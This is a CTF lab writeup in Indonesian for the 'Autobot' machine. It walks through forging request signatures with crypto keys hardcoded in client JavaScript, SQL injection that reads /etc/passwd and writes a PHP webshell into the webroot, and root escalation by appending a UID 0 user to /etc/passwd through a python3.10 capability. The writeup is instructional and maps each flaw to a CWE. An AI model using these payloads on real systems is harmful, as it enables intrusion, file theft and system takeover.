# HackTrace CTF Writeup — Autobot

|||
|---|---|
|**Target IP**|10.1.2.148|
|**Hostname**|autobot.htr|
|**OS**|Linux (Ubuntu)|
|**Difficulty**|Moderate|
|**Maker**|Nairpaa|

---

## Ringkasan Eksekutif

Mesin **Autobot** adalah aplikasi web katalog "Transformer" yang mengekspos endpoint `POST /details.php` dengan parameter `id` terenkripsi AES dan header `X-Signature` (HMAC-SHA256) sebagai mekanisme "proteksi" terhadap manipulasi input. Proteksi ini gagal total karena **kunci AES, IV, dan secret HMAC di-hardcode di file JavaScript client-side (`main.js`)** yang bisa diunduh dan dibaca siapa saja. Setelah key berhasil di-reverse dari kode yang di-obfuscate, signature apapun bisa di-forge, membuka jalan ke **IDOR** dan lebih jauh lagi **SQL Injection numeric-context** pada parameter `id`.

Eksploitasi SQLi berhasil mengonfirmasi struktur database, dan yang paling krusial: akun database aplikasi (`autobot@localhost`) diberikan **privilege `FILE`** yang berlebihan (excessive privilege). Privilege ini dimanfaatkan untuk **arbitrary file read** (`LOAD_FILE`) sekaligus **arbitrary file write** (`INTO OUTFILE`), yang berujung pada penulisan webshell PHP langsung ke document root aplikasi (`/var/www/autobot-dev/`, ditemukan lewat kebocoran informasi di `info.php`/`phpinfo()`) memberikan **Remote Code Execution** sebagai user `www-data`.

Privilege escalation ke root dicapai melalui misconfigured Linux capability `cap_dac_override` pada binary `/usr/bin/python3.10`, yang memungkinkan bypass seluruh permission check filesystem untuk menulis entry user baru dengan UID 0 langsung ke `/etc/passwd`.

**Rantai kerentanan lengkap:**

```
Hardcoded crypto secret (client-side)
   → Signature forging → IDOR
   → SQL Injection (unquoted numeric context)
   → Excessive DB privilege (FILE)
   → Arbitrary file read/write
   → Webshell RCE (www-data)
   → Privesc via cap_dac_override
   → Root
```

---

## 1. Reconnaissance

### 1.1 Port scanning

```bash
rustscan -a 10.1.2.148 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

```
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.52 (redirect ke https://autobot.htr/)
443/tcp open  ssl/http Apache httpd 2.4.52 (Ubuntu)
        ssl-cert Subject: commonName=autobot.htr, organizationName=Autobot,
                  stateOrProvinceName=Jakarta, countryName=ID
```

SSL certificate mengekspos hostname internal `autobot.htr`, ditambahkan ke `/etc/hosts`:

```bash
echo "10.1.2.148 autobot.htr" | sudo tee -a /etc/hosts
```

### 1.2 Content discovery

```bash
feroxbuster -u https://autobot.htr/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 100 -k --dont-filter -x html,php,txt \
  --filter-status 404,400 --redirects -o 80.txt
```

|Status|Path|Catatan|
|---|---|---|
|200|`/` , `/index.php`|Halaman katalog robot|
|200|`/main.js`|JavaScript aplikasi — **kunci temuan utama**|
|200|`/images/*.jpg`|Aset gambar robot|
|200|`/info.php`|**`phpinfo()` terekspos** — bocorkan `DOCUMENT_ROOT`|
|500|`/details.php`|Endpoint utama (butuh POST + signature)|
|403|`/server-status`, `.html`, `.php`|Forbidden|

### 1.3 Analisis request `/details.php`

Request dari aplikasi ke endpoint detail robot:

```http
POST /details.php HTTP/1.1
Host: autobot.htr
Content-Type: application/json
X-Signature: a9b282ae6fec1f4c004bda6e0c0fa73f56c2d581eb7d1f14d2818b02c63e7fbc

{"id":"/LnD2D9bEY1Clrbr2xB2rw=="}
```

Observasi:

- `id` adalah base64 dari 16 byte → indikasi 1 block AES.
- `X-Signature` hex 64 karakter → pola HMAC-SHA256.
- Mengirim `id` kosong → response `Invalid signature!` (signature divalidasi sebelum decrypt/lookup).
- Mengubah 1 karakter `id` tanpa update signature → tetap ditolak (signature terikat pada isi request, tidak bisa asal tamper).

---

## 2. Exploitation  Client-Side Secret Exposure

### 2.1 Deobfuscation `main.js`

`main.js` di-obfuscate dengan teknik **string array extraction**: seluruh string literal (termasuk secret kriptografi) disimpan dalam array `_0x10ae[]` berformat hex escape (`\xNN`), diakses via index. Setelah didekode dan ditelusuri alur pemanggilannya, ditemukan:

```javascript
function encryptRobotId(id) {
    const key = CryptoJS.enc.Hex.parse("CE3079D025B694ED3584AAD418CF478A");
    const iv  = CryptoJS.enc.Hex.parse("D01D2F4E94A9C50F0D26BA06590868B4");
    const encrypted = CryptoJS.AES.encrypt(id, key, { iv: iv }); // CBC, PKCS7
    return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
}

function createHmacSignature(jsonBody) {
    const secret = "5CA1C12F155310445D5F5488CCE3EAA8"; // dipakai sbg string, bukan hex-decoded
    return CryptoJS.HmacSHA256(jsonBody, secret).toString();
}
```

**Temuan kritis:** AES key, IV, dan HMAC secret **di-hardcode di client-side JavaScript**  dapat dibaca siapa saja lewat DevTools atau download langsung `main.js`.

- **Vulnerability class:** CWE-321 (Use of Hard-coded Cryptographic Key)
- **Impact:** Mekanisme signature ini murni _security theater_  attacker bisa forge signature valid untuk payload `id` apapun tanpa perlu membobol apapun di sisi server.

### 2.2 PoC  Forge signature valid

Ditulis tool Python (`forge_autobot.py` / kemudian `autobot_sqli.py`) yang meniru persis alur `main.js`:

1. AES-128-CBC encrypt plaintext id → base64 (key & IV hasil reversing).
2. Bangun JSON body `{"id": "<ciphertext>"}`.
3. HMAC-SHA256(body_string, secret) → header `X-Signature`.

**Validasi:** hasil forge untuk id `4` menghasilkan ciphertext **dan** signature yang **identik 100%** dengan request original hasil capture Burp (id=4 → "Tekkaman"). Implementasi dikonfirmasi benar.

Kendala teknis minor selama development: sertifikat SSL self-signed (butuh skip verifikasi TLS), dan kesalahan awal desain filter (mencoba grep isi payload SQL dari curl command padahal payload sudah terenkripsi jadi ciphertext base64 tidak akan pernah match teks plaintext-nya).

---

## 3. IDOR  Enumerasi ID

Dengan kemampuan forge signature, dilakukan enumerasi `id` plaintext 1–30:

|id|Hasil|
|---|---|
|1|Optimus Prime|
|2|Grendizer|
|3|Polimar|
|4|Tekkaman|
|5|Getter Robo|
|6|Mazinger|
|7|Gurren Lagann|
|8–30|Template kosong (no match, query valid)|

---

## 4. SQL Injection

### 4.1 Deteksi awal

Payload non-numerik diuji untuk melihat respons anomali:

| Payload                           | Hasil                                                           |
| --------------------------------- | --------------------------------------------------------------- |
| `1 OR 1=1`                        | Row pertama (Optimus Prime)  indikasi numeric-context injection |
| `1;--`                            | Row pertama (Optimus Prime)                                     |
| `admin`                           | **Gagal total** (respons kosong, bukan template kosong biasa)   |
| `1' OR '1'='1`                    | **Gagal total**                                                 |
| `1 UNION SELECT NULL,NULL,NULL--` | **Gagal total**                                                 |

**Analisis:** perbedaan antara "template kosong" (no row match, query valid) vs "gagal total tanpa output" (query error) mengindikasikan value hasil decrypt di-**concatenate langsung ke query SQL tanpa quote** (numeric context):

```sql
SELECT ... FROM robot_list WHERE id = <hasil_decrypt>
```

- **Vulnerability class:** CWE-89 (SQL Injection). Root cause: input user (setelah decrypt AES) tidak di-parameterize/sanitasi sebelum masuk query.

### 4.2 Menentukan jumlah kolom (`ORDER BY`)

|Payload|HTTP Status|
|---|---|
|`1 ORDER BY 1--` s/d `4--`|`200 OK`|
|`1 ORDER BY 5--` s/d `7--`|`500 Internal Server Error`|

→ **4 kolom** dikonfirmasi.

### 4.3 UNION-based extraction

```sql
0 UNION SELECT 1,database(),version(),user()--
```

|Info|Value|
|---|---|
|Database|`robot`|
|MySQL version|`8.0.34-0ubuntu0.22.04.1`|
|DB user|`autobot@localhost`|

Karena aplikasi hanya me-render **row pertama** dari result set, digunakan `GROUP_CONCAT()` untuk menggabungkan banyak baris jadi satu string:

```sql
0 UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ' | '),3,4
  FROM information_schema.tables WHERE table_schema=database()--
```

**Hasil enumerasi:**

- Tabel: hanya `robot_list` (kolom: `id | name | image_path | description`)
- Database lain di server: `information_schema`, `performance_schema`, `robot` tidak ada database tersembunyi/tabel kredensial terpisah.
- Isi tabel `robot_list` sesuai 7 row yang sudah ditemukan via IDOR, tidak ada row tersembunyi.

### 4.4 Privilege check

```sql
0 UNION SELECT 1,GROUP_CONCAT(privilege_type SEPARATOR ' | '),3,4
  FROM information_schema.user_privileges--
```

**Hasil: `FILE`** akun database `autobot@localhost` memiliki privilege `FILE`.

- **Vulnerability class:** CWE-250 (Execution with Unnecessary Privileges). Akun DB aplikasi seharusnya hanya butuh `SELECT` pada tabel `robot_list`, bukan privilege administratif seperti `FILE`.

### 4.5 Arbitrary File Read via `LOAD_FILE()`

```sql
0 UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
```

Berhasil membaca `/etc/passwd` secara penuh. Temuan penting dari isinya:

```
optimus:x:1000:1000:optimus:/home/optimus:/bin/bash
```

→ User sistem `optimus` (UID 1000, shell `/bin/bash`) teridentifikasi sebagai kandidat target selanjutnya.

Path document root aplikasi yang sebenarnya (`/var/www/autobot-dev/`, bukan `/var/www/html/` default) ditemukan lewat **`phpinfo()` yang terekspos di `/info.php`** (ditemukan saat content discovery awal), bukan lewat parsing config Apache  jalur yang jauh lebih langsung.

### 4.6 Arbitrary File Write via `INTO OUTFILE`

```sql
0 UNION SELECT 1,'<konten>',3,4 INTO OUTFILE '<path>'--
```

Query jenis ini konsisten mengembalikan HTTP `500`, namun ini **bukan indikasi kegagalan**  melainkan efek samping karena kode aplikasi mencoba fetch resultset dari query `INTO OUTFILE` yang memang tidak mengembalikan baris apapun, sehingga error terjadi di lapisan render PHP, **setelah** MySQL berhasil menulis file di level sistem. Verifikasi selalu dilakukan dengan membaca balik file lewat `LOAD_FILE()`.

**Konfirmasi write access:** file test berhasil ditulis ke `/tmp/sqli_test.txt` dan terbaca kembali dengan isi identik.

---

## 5. Remote Code Execution Webshell via SQLi

Dengan document root diketahui (`/var/www/autobot-dev/`) dan write primitive dikonfirmasi, webshell PHP ditulis langsung ke webroot:

```sql
0 UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4
  INTO OUTFILE '/var/www/autobot-dev/pwn.php'--
```

Verifikasi tulis (`LOAD_FILE`) mengonfirmasi isi file sesuai payload. Eksekusi command dikonfirmasi lewat:

```bash
curl -sk "https://autobot.htr/pwn.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**RCE tercapai sebagai `www-data`.** Reverse shell diperoleh dengan trigger command via webshell ke listener `netcat` lokal, kemudian di-stabilkan dengan PTY spawn:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**User flag** ditemukan di `/home/optimus/user.txt`.

---

## 6. Privilege Escalation Misconfigured Linux Capability

### 6.1 Enumerasi

`linpeas.sh` menandai (95% confidence) temuan berikut sebagai vektor privesc utama:

```
Files with capabilities (limited to 50):
/usr/bin/python3.10 cap_dac_override=ep
/usr/bin/mtr-packet  cap_net_raw=ep
/usr/bin/ping        cap_net_raw=ep
...
```

`cap_dac_override` pada `/usr/bin/python3.10` berarti proses ini dapat **bypass seluruh permission check read/write/execute** di filesystem, terlepas dari ownership file  meskipun dijalankan sebagai user non-root (`www-data`).

### 6.2 Eksploitasi

Dari shell `www-data`, entry user baru dengan UID/GID 0 ditulis langsung ke `/etc/passwd`, bypass permission `root:root` berkat capability tersebut:

```bash
python3.10 -c '
import crypt, os
password_hash = crypt.crypt("pwned123", "aa")
with open("/etc/passwd", "a") as f:
    f.write(f"hacker:{password_hash}:0:0:root:/root:/bin/bash\n")
print("done, cek /etc/passwd")
'
```

Verifikasi:

```bash
tail -3 /etc/passwd
# hacker:aasAxEWxN9Rms:0:0:root:/root:/bin/bash
```

Switch ke user baru:

```bash
su hacker
# Password: pwned123
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Root tercapai.**

- **Vulnerability class:** CWE-732 (Incorrect Permission Assignment for Critical Resource) / misconfigured Linux capabilities `cap_dac_override` seharusnya tidak pernah diberikan ke interpreter serba-guna seperti `python3.10`, karena ini setara memberi bypass permission universal ke siapapun yang bisa menjalankan Python di sistem tersebut.

### 6.3 Catatan: Anti-cheese trap

Percobaan baca `/root/root.txt` lewat akun `hacker` (root palsu hasil injeksi `/etc/passwd`) menghasilkan pesan:

```
Get the shell first :p
```

Ini adalah mekanisme yang sengaja ditaruh pembuat mesin untuk mendeteksi teknik "cheesing" privesc lewat modifikasi `/etc/passwd` tanpa benar-benar mendapatkan shell interaktif root yang sah. Flag root sebenarnya ditemukan di path terpisah:

```
/root/theflagishere.txt
```

---

## 7. Root Cause Analysis

|#|Isu|CWE|
|---|---|---|
|1|AES key, IV, dan HMAC secret di-hardcode di client-side JS|CWE-321|
|2|Parameter `id` (setelah decrypt) di-concatenate langsung ke query SQL tanpa parameterized query|CWE-89|
|3|Akun database aplikasi diberi privilege `FILE` yang tidak diperlukan|CWE-250|
|4|Differential error response (500 vs template kosong) membocorkan informasi struktur query|CWE-209|
|5|`phpinfo()` diekspos di endpoint publik (`/info.php`), membocorkan `DOCUMENT_ROOT` dan konfigurasi server|CWE-200|
|6|Linux capability `cap_dac_override` diberikan ke binary Python serba-guna|CWE-732|
